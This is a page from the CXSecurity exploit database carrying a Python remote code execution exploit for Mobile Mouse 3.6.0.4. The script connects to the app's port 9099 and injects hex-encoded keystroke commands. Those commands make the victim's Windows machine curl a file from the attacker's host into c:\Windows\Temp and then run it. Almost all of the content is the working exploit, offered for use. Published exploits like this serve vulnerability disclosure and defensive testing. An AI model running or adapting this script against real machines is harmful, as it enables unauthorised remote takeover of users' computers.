---
title: Mobile Mouse 3.6.0.4 Remote Code Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2022100050
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-10-19
fetch_date: 2025-10-03T20:12:15.549132
---

# Mobile Mouse 3.6.0.4 Remote Code Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Mobile Mouse 3.6.0.4 Remote Code Execution (RCE)** **2022.10.18**  Credit:  **[Chokri Hammedi](https://cxsecurity.com/author/Chokri%2BHammedi/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Mobile Mouse 3.6.0.4 - Remote Code Execution (RCE)
# Date: Aug 09, 2022
# Exploit Author: Chokri Hammedi
# Vendor Homepage: https://mobilemouse.com/
# Software Link: https://www.mobilemouse.com/downloads/setup.exe
# Version: 3.6.0.4
# Tested on: Windows 10 Enterprise LTSC Build 17763
#!/usr/bin/env python3
import socket
from time import sleep
import argparse
help = " Mobile Mouse 3.6.0.4 Remote Code Execution "
parser = argparse.ArgumentParser(description=help)
parser.add\_argument("--target", help="Target IP", required=True)
parser.add\_argument("--file", help="File name to Upload")
parser.add\_argument("--lhost", help="Your local IP", default="127.0.0.1")
args = parser.parse\_args()
host = args.target
command\_shell = args.file
lhost = args.lhost
port = 9099 # Default Port
s = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
s.connect((host, port))
CONN = bytearray.fromhex("434F4E4E4543541E1E63686F6B726968616D6D6564691E6950686F6E651E321E321E04")
s.send(CONN)
run = s.recv(54)
RUN = bytearray.fromhex("4b45591e3131341e721e4f505404")
s.send(RUN)
run = s.recv(54)
sleep(0.5)
download\_string= f"curl http://{lhost}:8080/{command\_shell} -o
c:\Windows\Temp\{command\_shell}".encode('utf-8')
hex\_shell = download\_string.hex()
SHELL = bytearray.fromhex("4B45591E3130301E" + hex\_shell + "1E04" +
"4b45591e2d311e454e5445521e04")
s.send(SHELL)
shell = s.recv(96)
print ("Executing The Command Shell...")
sleep(1.2)
RUN2 = bytearray.fromhex("4b45591e3131341e721e4f505404")
s.send(RUN2)
run2 = s.recv(54)
shell\_string= f"c:\Windows\Temp\{command\_shell}".encode('utf-8')
hex\_run = shell\_string.hex()
RUN3 = bytearray.fromhex("4B45591E3130301E" + hex\_run + "1E04" +
"4b45591e2d311e454e5445521e04")
s.send(RUN3)
run3 = s.recv(96)
print (" Take The Rose")
sleep(10)
s.close()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022100050)

[Tweet](https://twitter.com/share)

Vote for this issue:
 5
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top